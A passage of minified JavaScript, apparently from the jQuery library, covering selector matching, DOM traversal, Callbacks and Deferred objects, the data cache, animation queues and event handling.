                if (j = o[0] = o[0].slice(0), j.length > 2 && "ID" === (k = j[0]).type && c.getById && 9 === b.nodeType && p && d.relative[j[1].type]) {
                    if (b = (d.find.ID(k.matches[0].replace(ca, da), b) || [])[0], !b) return e;
                    n && (b = b.parentNode), a = a.slice(j.shift().value.length)
                }
                i = X.needsContext.test(a) ? 0 : j.length;
                while (i--) {
                    if (k = j[i], d.relative[l = k.type]) break;
                    if ((m = d.find[l]) && (f = m(k.matches[0].replace(ca, da), aa.test(j[0].type) && pa(b.parentNode) || b))) {
                        if (j.splice(i, 1), a = f.length && ra(j), !a) return H.apply(e, f), e;
                        break
                    }
                }
            }
            return (n || h(a, o))(f, b, !p, e, aa.test(a) && pa(b.parentNode) || b), e
        }, c.sortStable = u.split("").sort(B).join("") === u, c.detectDuplicates = !!l, m(), c.sortDetached = ja(function(a) {
            return 1 & a.compareDocumentPosition(n.createElement("div"))
        }), ja(function(a) {
            return a.innerHTML = "<a href='#'></a>", "#" === a.firstChild.getAttribute("href")
        }) || ka("type|href|height|width", function(a, b, c) {
            return c ? void 0 : a.getAttribute(b, "type" === b.toLowerCase() ? 1 : 2)
        }), c.attributes && ja(function(a) {
            return a.innerHTML = "<input/>", a.firstChild.setAttribute("value", ""), "" === a.firstChild.getAttribute("value")
        }) || ka("value", function(a, b, c) {
            return c || "input" !== a.nodeName.toLowerCase() ? void 0 : a.defaultValue
        }), ja(function(a) {
            return null == a.getAttribute("disabled")
        }) || ka(K, function(a, b, c) {
            var d;
            return c ? void 0 : a[b] === !0 ? b.toLowerCase() : (d = a.getAttributeNode(b)) && d.specified ? d.value : null
        }), ga
    }(a);
    n.find = t, n.expr = t.selectors, n.expr[":"] = n.expr.pseudos, n.unique = t.uniqueSort, n.text = t.getText, n.isXMLDoc = t.isXML, n.contains = t.contains;
    var u = n.expr.match.needsContext,
        v = /^<(\w+)\s*\/?>(?:<\/\1>|)$/,
        w = /^.[^:#\[\.,]*$/;

    function x(a, b, c) {
        if (n.isFunction(b)) return n.grep(a, function(a, d) {
            return !!b.call(a, d, a) !== c
        });
        if (b.nodeType) return n.grep(a, function(a) {
            return a === b !== c
        });
        if ("string" == typeof b) {
            if (w.test(b)) return n.filter(b, a, c);
            b = n.filter(b, a)
        }
        return n.grep(a, function(a) {
            return g.call(b, a) >= 0 !== c
        })
    }
    n.filter = function(a, b, c) {
        var d = b[0];
        return c && (a = ":not(" + a + ")"), 1 === b.length && 1 === d.nodeType ? n.find.matchesSelector(d, a) ? [d] : [] : n.find.matches(a, n.grep(b, function(a) {
            return 1 === a.nodeType
        }))
    }, n.fn.extend({
        find: function(a) {
            var b, c = this.length,
                d = [],
                e = this;
            if ("string" != typeof a) return this.pushStack(n(a).filter(function() {
                for (b = 0; c > b; b++)
                    if (n.contains(e[b], this)) return !0
            }));
            for (b = 0; c > b; b++) n.find(a, e[b], d);
            return d = this.pushStack(c > 1 ? n.unique(d) : d), d.selector = this.selector ? this.selector + " " + a : a, d
        },
        filter: function(a) {
            return this.pushStack(x(this, a || [], !1))
        },
        not: function(a) {
            return this.pushStack(x(this, a || [], !0))
        },
        is: function(a) {
            return !!x(this, "string" == typeof a && u.test(a) ? n(a) : a || [], !1).length
        }
    });
    var y, z = /^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]*))$/,
        A = n.fn.init = function(a, b) {
            var c, d;
            if (!a) return this;
            if ("string" == typeof a) {
                if (c = "<" === a[0] && ">" === a[a.length - 1] && a.length >= 3 ? [null, a, null] : z.exec(a), !c || !c[1] && b) return !b || b.jquery ? (b || y).find(a) : this.constructor(b).find(a);
                if (c[1]) {
                    if (b = b instanceof n ? b[0] : b, n.merge(this, n.parseHTML(c[1], b && b.nodeType ? b.ownerDocument || b : l, !0)), v.test(c[1]) && n.isPlainObject(b))
                        for (c in b) n.isFunction(this[c]) ? this[c](b[c]) : this.attr(c, b[c]);
                    return this
                }
                return d = l.getElementById(c[2]), d && d.parentNode && (this.length = 1, this[0] = d), this.context = l, this.selector = a, this
            }
            return a.nodeType ? (this.context = this[0] = a, this.length = 1, this) : n.isFunction(a) ? "undefined" != typeof y.ready ? y.ready(a) : a(n) : (void 0 !== a.selector && (this.selector = a.selector, this.context = a.context), n.makeArray(a, this))
        };
    A.prototype = n.fn, y = n(l);
    var B = /^(?:parents|prev(?:Until|All))/,
        C = {
            children: !0,
            contents: !0,
            next: !0,
            prev: !0
        };
    n.extend({
        dir: function(a, b, c) {
            var d = [],
                e = void 0 !== c;
            while ((a = a[b]) && 9 !== a.nodeType)
                if (1 === a.nodeType) {
                    if (e && n(a).is(c)) break;
                    d.push(a)
                }
            return d
        },
        sibling: function(a, b) {
            for (var c = []; a; a = a.nextSibling) 1 === a.nodeType && a !== b && c.push(a);
            return c
        }
    }), n.fn.extend({
        has: function(a) {
            var b = n(a, this),
                c = b.length;
            return this.filter(function() {
                for (var a = 0; c > a; a++)
                    if (n.contains(this, b[a])) return !0
            })
        },
        closest: function(a, b) {
            for (var c, d = 0, e = this.length, f = [], g = u.test(a) || "string" != typeof a ? n(a, b || this.context) : 0; e > d; d++)
                for (c = this[d]; c && c !== b; c = c.parentNode)
                    if (c.nodeType < 11 && (g ? g.index(c) > -1 : 1 === c.nodeType && n.find.matchesSelector(c, a))) {
                        f.push(c);
                        break
                    }
            return this.pushStack(f.length > 1 ? n.unique(f) : f)
        },
        index: function(a) {
            return a ? "string" == typeof a ? g.call(n(a), this[0]) : g.call(this, a.jquery ? a[0] : a) : this[0] && this[0].parentNode ? this.first().prevAll().length : -1
        },
        add: function(a, b) {
            return this.pushStack(n.unique(n.merge(this.get(), n(a, b))))
        },
        addBack: function(a) {
            return this.add(null == a ? this.prevObject : this.prevObject.filter(a))
        }
    });

    function D(a, b) {
        while ((a = a[b]) && 1 !== a.nodeType);
        return a
    }
    n.each({
        parent: function(a) {
            var b = a.parentNode;
            return b && 11 !== b.nodeType ? b : null
        },
        parents: function(a) {
            return n.dir(a, "parentNode")
        },
        parentsUntil: function(a, b, c) {
            return n.dir(a, "parentNode", c)
        },
        next: function(a) {
            return D(a, "nextSibling")
        },
        prev: function(a) {
            return D(a, "previousSibling")
        },
        nextAll: function(a) {
            return n.dir(a, "nextSibling")
        },
        prevAll: function(a) {
            return n.dir(a, "previousSibling")
        },
        nextUntil: function(a, b, c) {
            return n.dir(a, "nextSibling", c)
        },
        prevUntil: function(a, b, c) {
            return n.dir(a, "previousSibling", c)
        },
        siblings: function(a) {
            return n.sibling((a.parentNode || {}).firstChild, a)
        },
        children: function(a) {
            return n.sibling(a.firstChild)
        },
        contents: function(a) {
            return a.contentDocument || n.merge([], a.childNodes)
        }
    }, function(a, b) {
        n.fn[a] = function(c, d) {
            var e = n.map(this, b, c);
            return "Until" !== a.slice(-5) && (d = c), d && "string" == typeof d && (e = n.filter(d, e)), this.length > 1 && (C[a] || n.unique(e), B.test(a) && e.reverse()), this.pushStack(e)
        }
    });
    var E = /\S+/g,
        F = {};

    function G(a) {
        var b = F[a] = {};
        return n.each(a.match(E) || [], function(a, c) {
            b[c] = !0
        }), b
    }
    n.Callbacks = function(a) {
        a = "string" == typeof a ? F[a] || G(a) : n.extend({}, a);
        var b, c, d, e, f, g, h = [],
            i = !a.once && [],
            j = function(l) {
                for (b = a.memory && l, c = !0, g = e || 0, e = 0, f = h.length, d = !0; h && f > g; g++)
                    if (h[g].apply(l[0], l[1]) === !1 && a.stopOnFalse) {
                        b = !1;
                        break
                    }
                d = !1, h && (i ? i.length && j(i.shift()) : b ? h = [] : k.disable())
            },
            k = {
                add: function() {
                    if (h) {
                        var c = h.length;
                        ! function g(b) {
                            n.each(b, function(b, c) {
                                var d = n.type(c);
                                "function" === d ? a.unique && k.has(c) || h.push(c) : c && c.length && "string" !== d && g(c)
                            })
                        }(arguments), d ? f = h.length : b && (e = c, j(b))
                    }
                    return this
                },
                remove: function() {
                    return h && n.each(arguments, function(a, b) {
                        var c;
                        while ((c = n.inArray(b, h, c)) > -1) h.splice(c, 1), d && (f >= c && f--, g >= c && g--)
                    }), this
                },
                has: function(a) {
                    return a ? n.inArray(a, h) > -1 : !(!h || !h.length)
                },
                empty: function() {
                    return h = [], f = 0, this
                },
                disable: function() {
                    return h = i = b = void 0, this
                },
                disabled: function() {
                    return !h
                },
                lock: function() {
                    return i = void 0, b || k.disable(), this
                },
                locked: function() {
                    return !i
                },
                fireWith: function(a, b) {
                    return !h || c && !i || (b = b || [], b = [a, b.slice ? b.slice() : b], d ? i.push(b) : j(b)), this
                },
                fire: function() {
                    return k.fireWith(this, arguments), this
                },
                fired: function() {
                    return !!c
                }
            };
        return k
    }, n.extend({
        Deferred: function(a) {
            var b = [
                    ["resolve", "done", n.Callbacks("once memory"), "resolved"],
                    ["reject", "fail", n.Callbacks("once memory"), "rejected"],
                    ["notify", "progress", n.Callbacks("memory")]
                ],
                c = "pending",
                d = {
                    state: function() {
                        return c
                    },
                    always: function() {
                        return e.done(arguments).fail(arguments), this
                    },
                    then: function() {
                        var a = arguments;
                        return n.Deferred(function(c) {
                            n.each(b, function(b, f) {
                                var g = n.isFunction(a[b]) && a[b];
                                e[f[1]](function() {
                                    var a = g && g.apply(this, arguments);
                                    a && n.isFunction(a.promise) ? a.promise().done(c.resolve).fail(c.reject).progress(c.notify) : c[f[0] + "With"](this === d ? c.promise() : this, g ? [a] : arguments)
                                })
                            }), a = null
                        }).promise()
                    },
                    promise: function(a) {
                        return null != a ? n.extend(a, d) : d
                    }
                },
                e = {};
            return d.pipe = d.then, n.each(b, function(a, f) {
                var g = f[2],
                    h = f[3];
                d[f[1]] = g.add, h && g.add(function() {
                    c = h
                }, b[1 ^ a][2].disable, b[2][2].lock), e[f[0]] = function() {
                    return e[f[0] + "With"](this === e ? d : this, arguments), this
                }, e[f[0] + "With"] = g.fireWith
            }), d.promise(e), a && a.call(e, e), e
        },
        when: function(a) {
            var b = 0,
                c = d.call(arguments),
                e = c.length,
                f = 1 !== e || a && n.isFunction(a.promise) ? e : 0,
                g = 1 === f ? a : n.Deferred(),
                h = function(a, b, c) {
                    return function(e) {
                        b[a] = this, c[a] = arguments.length > 1 ? d.call(arguments) : e, c === i ? g.notifyWith(b, c) : --f || g.resolveWith(b, c)
                    }
                },
                i, j, k;
            if (e > 1)
                for (i = new Array(e), j = new Array(e), k = new Array(e); e > b; b++) c[b] && n.isFunction(c[b].promise) ? c[b].promise().done(h(b, k, c)).fail(g.reject).progress(h(b, j, i)) : --f;
            return f || g.resolveWith(k, c), g.promise()
        }
    });
    var H;
    n.fn.ready = function(a) {
        return n.ready.promise().done(a), this
    }, n.extend({
        isReady: !1,
        readyWait: 1,
        holdReady: function(a) {
            a ? n.readyWait++ : n.ready(!0)
        },
        ready: function(a) {
            (a === !0 ? --n.readyWait : n.isReady) || (n.isReady = !0, a !== !0 && --n.readyWait > 0 || (H.resolveWith(l, [n]), n.fn.triggerHandler && (n(l).triggerHandler("ready"), n(l).off("ready"))))
        }
    });

    function I() {
        l.removeEventListener("DOMContentLoaded", I, !1), a.removeEventListener("load", I, !1), n.ready()
    }
    n.ready.promise = function(b) {
        return H || (H = n.Deferred(), "complete" === l.readyState ? setTimeout(n.ready) : (l.addEventListener("DOMContentLoaded", I, !1), a.addEventListener("load", I, !1))), H.promise(b)
    }, n.ready.promise();
    var J = n.access = function(a, b, c, d, e, f, g) {
        var h = 0,
            i = a.length,
            j = null == c;
        if ("object" === n.type(c)) {
            e = !0;
            for (h in c) n.access(a, b, h, c[h], !0, f, g)
        } else if (void 0 !== d && (e = !0, n.isFunction(d) || (g = !0), j && (g ? (b.call(a, d), b = null) : (j = b, b = function(a, b, c) {
                return j.call(n(a), c)
            })), b))
            for (; i > h; h++) b(a[h], c, g ? d : d.call(a[h], h, b(a[h], c)));
        return e ? a : j ? b.call(a) : i ? b(a[0], c) : f
    };
    n.acceptData = function(a) {
        return 1 === a.nodeType || 9 === a.nodeType || !+a.nodeType
    };

    function K() {
        Object.defineProperty(this.cache = {}, 0, {
            get: function() {
                return {}
            }
        }), this.expando = n.expando + K.uid++
    }
    K.uid = 1, K.accepts = n.acceptData, K.prototype = {
        key: function(a) {
            if (!K.accepts(a)) return 0;
            var b = {},
                c = a[this.expando];
            if (!c) {
                c = K.uid++;
                try {
                    b[this.expando] = {
                        value: c
                    }, Object.defineProperties(a, b)
                } catch (d) {
                    b[this.expando] = c, n.extend(a, b)
                }
            }
            return this.cache[c] || (this.cache[c] = {}), c
        },
        set: function(a, b, c) {
            var d, e = this.key(a),
                f = this.cache[e];
            if ("string" == typeof b) f[b] = c;
            else if (n.isEmptyObject(f)) n.extend(this.cache[e], b);
            else
                for (d in b) f[d] = b[d];
            return f
        },
        get: function(a, b) {
            var c = this.cache[this.key(a)];
            return void 0 === b ? c : c[b]
        },
        access: function(a, b, c) {
            var d;
            return void 0 === b || b && "string" == typeof b && void 0 === c ? (d = this.get(a, b), void 0 !== d ? d : this.get(a, n.camelCase(b))) : (this.set(a, b, c), void 0 !== c ? c : b)
        },
        remove: function(a, b) {
            var c, d, e, f = this.key(a),
                g = this.cache[f];
            if (void 0 === b) this.cache[f] = {};
            else {
                n.isArray(b) ? d = b.concat(b.map(n.camelCase)) : (e = n.camelCase(b), b in g ? d = [b, e] : (d = e, d = d in g ? [d] : d.match(E) || [])), c = d.length;
                while (c--) delete g[d[c]]
            }
        },
        hasData: function(a) {
            return !n.isEmptyObject(this.cache[a[this.expando]] || {})
        },
        discard: function(a) {
            a[this.expando] && delete this.cache[a[this.expando]]
        }
    };
    var L = new K,
        M = new K,
        N = /^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,
        O = /([A-Z])/g;

    function P(a, b, c) {
        var d;
        if (void 0 === c && 1 === a.nodeType)
            if (d = "data-" + b.replace(O, "-$1").toLowerCase(), c = a.getAttribute(d), "string" == typeof c) {
                try {
                    c = "true" === c ? !0 : "false" === c ? !1 : "null" === c ? null : +c + "" === c ? +c : N.test(c) ? n.parseJSON(c) : c
                } catch (e) {}
                M.set(a, b, c)
            } else c = void 0;
        return c
    }
    n.extend({
        hasData: function(a) {
            return M.hasData(a) || L.hasData(a)
        },
        data: function(a, b, c) {
            return M.access(a, b, c)
        },
        removeData: function(a, b) {
            M.remove(a, b)
        },
        _data: function(a, b, c) {
            return L.access(a, b, c)
        },
        _removeData: function(a, b) {
            L.remove(a, b)
        }
    }), n.fn.extend({
        data: function(a, b) {
            var c, d, e, f = this[0],
                g = f && f.attributes;
            if (void 0 === a) {
                if (this.length && (e = M.get(f), 1 === f.nodeType && !L.get(f, "hasDataAttrs"))) {
                    c = g.length;
                    while (c--) g[c] && (d = g[c].name, 0 === d.indexOf("data-") && (d = n.camelCase(d.slice(5)), P(f, d, e[d])));
                    L.set(f, "hasDataAttrs", !0)
                }
                return e
            }
            return "object" == typeof a ? this.each(function() {
                M.set(this, a)
            }) : J(this, function(b) {
                var c, d = n.camelCase(a);
                if (f && void 0 === b) {
                    if (c = M.get(f, a), void 0 !== c) return c;
                    if (c = M.get(f, d), void 0 !== c) return c;
                    if (c = P(f, d, void 0), void 0 !== c) return c
                } else this.each(function() {
                    var c = M.get(this, d);
                    M.set(this, d, b), -1 !== a.indexOf("-") && void 0 !== c && M.set(this, a, b)
                })
            }, null, b, arguments.length > 1, null, !0)
        },
        removeData: function(a) {
            return this.each(function() {
                M.remove(this, a)
            })
        }
    }), n.extend({
        queue: function(a, b, c) {
            var d;
            return a ? (b = (b || "fx") + "queue", d = L.get(a, b), c && (!d || n.isArray(c) ? d = L.access(a, b, n.makeArray(c)) : d.push(c)), d || []) : void 0
        },
        dequeue: function(a, b) {
            b = b || "fx";
            var c = n.queue(a, b),
                d = c.length,
                e = c.shift(),
                f = n._queueHooks(a, b),
                g = function() {
                    n.dequeue(a, b)
                };
            "inprogress" === e && (e = c.shift(), d--), e && ("fx" === b && c.unshift("inprogress"), delete f.stop, e.call(a, g, f)), !d && f && f.empty.fire()
        },
        _queueHooks: function(a, b) {
            var c = b + "queueHooks";
            return L.get(a, c) || L.access(a, c, {
                    empty: n.Callbacks("once memory").add(function() {
                        L.remove(a, [b + "queue", c])
                    })
                })
        }
    }), n.fn.extend({
        queue: function(a, b) {
            var c = 2;
            return "string" != typeof a && (b = a, a = "fx", c--), arguments.length < c ? n.queue(this[0], a) : void 0 === b ? this : this.each(function() {
                var c = n.queue(this, a, b);
                n._queueHooks(this, a), "fx" === a && "inprogress" !== c[0] && n.dequeue(this, a)
            })
        },
        dequeue: function(a) {
            return this.each(function() {
                n.dequeue(this, a)
            })
        },
        clearQueue: function(a) {
            return this.queue(a || "fx", [])
        },
        promise: function(a, b) {
            var c, d = 1,
                e = n.Deferred(),
                f = this,
                g = this.length,
                h = function() {
                    --d || e.resolveWith(f, [f])
                };
            "string" != typeof a && (b = a, a = void 0), a = a || "fx";
            while (g--) c = L.get(f[g], a + "queueHooks"), c && c.empty && (d++, c.empty.add(h));
            return h(), e.promise(b)
        }
    });
    var Q = /[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,
        R = ["Top", "Right", "Bottom", "Left"],
        S = function(a, b) {
            return a = b || a, "none" === n.css(a, "display") || !n.contains(a.ownerDocument, a)
        },
        T = /^(?:checkbox|radio)$/i;
    ! function() {
        var a = l.createDocumentFragment(),
            b = a.appendChild(l.createElement("div")),
            c = l.createElement("input");
        c.setAttribute("type", "radio"), c.setAttribute("checked", "checked"), c.setAttribute("name", "t"), b.appendChild(c), k.checkClone = b.cloneNode(!0).cloneNode(!0).lastChild.checked, b.innerHTML = "<textarea>x</textarea>", k.noCloneChecked = !!b.cloneNode(!0).lastChild.defaultValue
    }();
    var U = "undefined";
    k.focusinBubbles = "onfocusin" in a;
    var V = /^key/,
        W = /^(?:mouse|pointer|contextmenu)|click/,
        X = /^(?:focusinfocus|focusoutblur)$/,
        Y = /^([^.]*)(?:\.(.+)|)$/;

    function Z() {
        return !0
    }

    function $() {
        return !1
    }

    function _() {
        try {
            return l.activeElement
        } catch (a) {}
    }
    n.event = {
        global: {},
        add: function(a, b, c, d, e) {
            var f, g, h, i, j, k, l, m, o, p, q, r = L.get(a);
            if (r) {
                c.handler && (f = c, c = f.handler, e = f.selector), c.guid || (c.guid = n.guid++), (i = r.events) || (i = r.events = {}), (g = r.handle) || (g = r.handle = function(b) {
                    return typeof n !== U && n.event.triggered !== b.type ? n.event.dispatch.apply(a, arguments) : void 0
                }), b = (b || "").match(E) || [""], j = b.length;
                while (j--) h = Y.exec(b[j]) || [], o = q = h[1], p = (h[2] || "").split(".").sort(), o && (l = n.event.special[o] || {}, o = (e ? l.delegateType : l.bindType) || o, l = n.event.special[o] || {}, k = n.extend({
                    type: o,
                    origType: q,
                    data: d,
                    handler: c,
                    guid: c.guid,
                    selector: e,
                    needsContext: e && n.expr.match.needsContext.test(e),
                    namespace: p.join(".")
                }, f), (m = i[o]) || (m = i[o] = [], m.delegateCount = 0, l.setup && l.setup.call(a, d, p, g) !== !1 || a.addEventListener && a.addEventListener(o, g, !1)), l.add && (l.add.call(a, k), k.handler.guid || (k.handler.guid = c.guid)), e ? m.splice(m.delegateCount++, 0, k) : m.push(k), n.event.global[o] = !0)
            }
        },
        remove: function(a, b, c, d, e) {
            var f, g, h, i, j, k, l, m, o, p, q, r = L.hasData(a) && L.get(a);
            if (r && (i = r.events)) {
                b = (b || "").match(E) || [""], j = b.length;
                while (j--)
                    if (h = Y.exec(b[j]) || [], o = q = h[1], p = (h[2] || "").split(".").sort(), o) {
                        l = n.event.special[o] || {}, o = (d ? l.delegateType : l.bindType) || o, m = i[o] || [], h = h[2] && new RegExp("(^|\\.)" + p.join("\\.(?:.*\\.|)") + "(\\.|$)"), g = f = m.length;
                        while (f--) k = m[f], !e && q !== k.origType || c && c.guid !== k.guid || h && !h.test(k.namespace) || d && d !== k.selector && ("**" !== d || !k.selector) || (m.splice(f, 1), k.selector && m.delegateCount--, l.remove && l.remove.call(a, k));
                        g && !m.length && (l.teardown && l.teardown.call(a, p, r.handle) !== !1 || n.removeEvent(a, o, r.handle), delete i[o])
                    } else
                        for (o in i) n.event.remove(a, o + b[j], c, d, !0);
                n.isEmptyObject(i) && (delete r.handle, L.remove(a, "events"))
            }
        },
        trigger: function(b, c, d, e) {
            var f, g, h, i, k, m, o, p = [d || l],
                q = j.call(b, "type") ? b.type : b,
                r = j.call(b, "namespace") ? b.namespace.split(".") : [];
            if (g = h = d = d || l, 3 !== d.nodeType && 8 !== d.nodeType && !X.test(q + n.event.triggered) && (q.indexOf(".") >= 0 && (r = q.split("."), q = r.shift(), r.sort()), k = q.indexOf(":") < 0 && "on" + q, b = b[n.expando] ? b : new n.Event(q, "object" == typeof b && b), b.isTrigger = e ? 2 : 3, b.namespace = r.join("."), b.namespace_re = b.namespace ? new RegExp("(^|\\.)" + r.join("\\.(?:.*\\.|)") + "(\\.|$)") : null, b.result = void 0, b.target || (b.target = d), c = null == c ? [b] : n.makeArray(c, [b]), o = n.event.special[q] || {}, e || !o.trigger || o.trigger.apply(d, c) !== !1)) {
                if (!e && !o.noBubble && !n.isWindow(d)) {
                    for (i = o.delegateType || q, X.test(i + q) || (g = g.parentNode); g; g = g.parentNode) p.push(g), h = g;
                    h === (d.ownerDocument || l) && p.push(h.defaultView || h.parentWindow || a)
                }
                f = 0;
                while ((g = p[f++]) && !b.isPropagationStopped()) b.type = f > 1 ? i : o.bindType || q, m = (L.get(g, "events") || {})[b.type] && L.get(g, "handle"), m && m.apply(g, c), m = k && g[k], m && m.apply && n.acceptData(g) && (b.result = m.apply(g, c), b.result === !1 && b.preventDefault());
                return b.type = q, e || b.isDefaultPrevented() || o._default && o._default.apply(p.pop(), c) !== !1 || !n.acceptData(d) || k && n.isFunction(d[q]) && !n.isWindow(d) && (h = d[k], h && (d[k] = null), n.event.triggered = q, d[q](), n.event.triggered = void 0, h && (d[k] = h)), b.result
            }
        },
        dispatch: function(a) {
            a = n.event.fix(a);
            var b, c, e, f, g, h = [],
                i = d.call(arguments),
                j = (L.get(this, "events") || {})[a.type] || [],
                k = n.event.special[a.type] || {};
            if (i[0] = a, a.delegateTarget = this, !k.preDispatch || k.preDispatch.call(this, a) !== !1) {
                h = n.event.handlers.call(this, a, j), b = 0;
                while ((f = h[b++]) && !a.isPropagationStopped()) {
                    a.currentTarget = f.elem, c = 0;
                    while ((g = f.handlers[c++]) && !a.isImmediatePropagationStopped())(!a.namespace_re || a.namespace_re.test(g.namespace)) && (a.handleObj = g, a.data = g.data, e = ((n.event.special[g.origType] || {}).handle || g.handler).apply(f.elem, i), void 0 !== e && (a.result = e) === !1 && (a.preventDefault(), a.stopPropagation()))
                }
                return k.postDispatch && k.postDispatch.call(this, a), a.result
            }
        },
        handlers: function(a, b) {
            var c, d, e, f, g = [],
                h = b.delegateCount,
                i = a.target;
            if (h && i.nodeType && (!a.button || "click" !== a.type))
                for (; i !== this; i = i.parentNode || this)
                    if (i.disabled !== !0 || "click" !== a.type) {
                        for (d = [], c = 0; h > c; c++) f = b[c], e = f.selector + " ", void 0 === d[e] && (d[e] = f.needsContext ? n(e, this).index(i) >= 0 : n.find(e, this, null, [i]).length), d[e] && d.push(f);
                        d.length && g.push({
                            elem: i,
                            handlers: d
                        })
                    }
            return h < b.length && g.push({
                elem: this,
                handlers: b.slice(h)
            }), g
        },
        props: "altKey bubbles cancelable ctrlKey currentTarget eventPhase metaKey relatedTarget shiftKey target timeStamp view which".split(" "),
        fixHooks: {},
        keyHooks: {
            props: "char charCode key keyCode".split(" "),
            filter: function(a, b) {
                return null == a.which && (a.which = null != b.charCode ? b.charCode : b.keyCode), a
            }
        },
        mouseHooks: {
            props: "button buttons clientX clientY offsetX offsetY pageX pageY screenX screenY toElement".split(" "),
            filter: function(a, b) {
                var c, d, e, f = b.button;
                return null == a.pageX && null != b.clientX && (c = a.target.ownerDocument || l, d = c.documentElement, e = c.body, a.pageX = b.clientX + (d && d.scrollLeft || e && e.scrollLeft || 0) - (d && d.clientLeft || e && e.clientLeft || 0), a.pageY = b.clientY + (d && d.scrollTop || e && e.scrollTop || 0) - (d && d.clientTop || e && e.clientTop || 0)), a.which || void 0 === f || (a.which = 1 & f ? 1 : 2 & f ? 3 : 4 & f ? 2 : 0), a
            }
        },
        fix: function(a) {
            if (a[n.expando]) return a;
            var b, c, d, e = a.type,
                f = a,
                g = this.fixHooks[e];
            g || (this.fixHooks[e] = g = W.test(e) ? this.mouseHooks : V.test(e) ? this.keyHooks : {}), d = g.props ? this.props.concat(g.props) : this.props, a = new n.Event(f), b = d.length;
            while (b--) c = d[b], a[c] = f[c];
            return a.target || (a.target = l), 3 === a.target.nodeType && (a.target = a.target.parentNode), g.filter ? g.filter(a, f) : a
        },
        special: {
            load: {
                noBubble: !0
            },
            focus: {
                trigger: function() {
                    return this !== _() && this.focus ? (this.focus(), !1) : void 0
                },
                delegateType: "focusin"
            },
            blur: {
                trigger: function() {
                    return this === _() && this.blur ? (this.blur(), !1) : void 0
                },
                delegateType: "focusout"
            },
            click: {
                trigger: function() {
                    return "checkbox" === this.type && this.click && n.nodeName(this, "input") ? (this.click(), !1) : void 0
                },
                _default: function(a) {
                    return n.nodeName(a.target, "a")
                }
            },
            beforeunload: {
                postDispatch: function(a) {
                    void 0 !== a.result && a.originalEvent && (a.originalEvent.returnValue = a.result)
                }
            }
        },
        simulate: function(a, b, c, d) {
            var e = n.extend(new n.Event, c, {
                type: a,
                isSimulated: !0,
                originalEvent: {}
            });
            d ? n.event.trigger(e, null, b) : n.event.dispatch.call(b, e), e.isDefaultPrevented() && c.preventDefault()
        }
    }, n.removeEvent = function(a, b, c) {
        a.removeEventListener && a.removeEventListener(b, c, !1)
    }, n.Event = function(a, b) {
        return this instanceof n.Event ? (a && a.type ? (this.originalEvent = a, this.type = a.type, this.isDefaultPrevented = a.defaultPrevented || void 0 === a.defaultPrevented && a.returnValue === !1 ? Z : $) : this.type = a, b && n.extend(this, b), this.timeStamp = a && a.timeStamp || n.now(), void(this[n.expando] = !0)) : new n.Event(a, b)
    }, n.Event.prototype = {
        isDefaultPrevented: $,
        isPropagationStopped: $,
        isImmediatePropagationStopped: $,
        preventDefault: function() {
            var a = this.originalEvent;
            this.isDefaultPrevented = Z, a && a.preventDefault && a.preventDefault()
        },
        stopPropagation: function() {
            var a = this.originalEvent;
            this.isPropagationStopped = Z, a && a.stopPropagation && a.stopPropagation()
        },
        stopImmediatePropagation: function() {
            var a = this.originalEvent;
            this.isImmediatePropagationStopped = Z, a && a.stopImmediatePropagation && a.stopImmediatePropagation(), this.stopPropagation()
        }
    }, n.each({
        mouseenter: "mouseover",
        mouseleave: "mouseout",
        pointerenter: "pointerover",
        pointerleave: "pointerout"
    }, function(a, b) {
        n.event.special[a] = {
            delegateType: b,
            bindType: b,
            handle: function(a) {
                var c, d = this,
                    e = a.relatedTarget,
                    f = a.handleObj;
                return (!e || e !== d && !n.contains(d, e)) && (a.type = f.origType, c = f.handler.apply(this, arguments), a.type = b), c
            }
        }
    }), k.focusinBubbles || n.each({
        focus: "focusin",
        blur: "focusout"
    }, function(a, b) {
        var c = function(a) {
            n.event.simulate(b, a.target, n.event.fix(a), !0)
        };
        n.event.special[b] = {
            setup: function() {
                var d = this.ownerDocument || this,
                    e = L.access(d, b);
                e || d.addEventListener(a, c, !0), L.access(d, b, (e || 0) + 1)
            },
            teardown: function() {
                var d = this.ownerDocument || this,
                    e = L.access(d, b) - 1;
                e ? L.access(d, b, e) : (d.removeEventListener(a, c, !0), L.remove(d, b))
            }
        }
    }), n.fn.extend({
        on: function(a, b, c, d, e) {
            var f, g;
            if ("object" == typeof a) {
                "string" != typeof b && (c = c || b, b = void 0);
                for (g in a) this.on(g, b, c, a[g], e);
                return this
            }
            if (null == c && null == d ? (d = b, c = b = void 0) : null == d && ("string" == typeof b ? (d = c, c = void 0) : (d = c, c = b, b = void 0)), d === !1) d = $;
            else if (!d) return this;
            return 1 === e && (f = d, d = function(a) {
                return n().off(a), f.apply(this, arguments)
            }, d.guid = f.guid || (f.guid = n.guid++)), this.each(function() {
                n.event.add(this, a, d, c, b)
            })
        },
        one: function(a, b, c, d) {
            return this.on(a, b, c, d, 1)
        },
        off: function(a, b, c) {
            var d, e;
            if (a && a.preventDefault && a.handleObj) return d = a.handleObj, n(a.delegateTarget).off(d.namespace ? d.origType + "." + d.namespace : d.origType, d.selector, d.handler), this;
            if ("object" == typeof a) {
                for (e in a) this.off(e, b, a[e]);
                return this
            }
            return (b === !1 || "function" == typeof b) && (c = b, b = void 0), c === !1 && (c = $), this.each(function() {
                n.event.remove(this, a, c, b)
            })
        },
        trigger: function(a, b) {
            return this.each(function() {
                n.event.trigger(a, b, this)
            })
        },
        triggerHandler: function(a, b) {
            var c = this[0];
            return c ? n.event.trigger(a, b, c, !0) : void 0
        }
    });
    var aa = /<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/gi,
        ba = /<([\w:]+)/,
        ca = /<|&#?\w+;/,
        da = /<(?:script|style|link)/i,
        ea = /checked\s*(?:[^=]|=\s*.checked.)/i,
        fa = /^$|\/(?:java|ecma)script/i,
        ga = /^true\/(.*)/,
        ha = /^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g,
        ia = {
            option: [1, "<select multiple='multiple'>", "</select>"],
            thead: [1, "<table>", "</table>"],
            col: [2, "<table><colgroup>", "</colgroup></table>"],
            tr: [2, "<table><tbody>", "</tbody></table>"],
            td: [3, "<table><tbody><tr>", "</tr></tbody></table>"],
            _default: [0, "", ""]
        };
    ia.optgroup = ia.option, ia.tbody = ia.tfoot = ia.colgroup = ia.caption = ia.thead, ia.th = ia.td;

    function ja(a, b) {
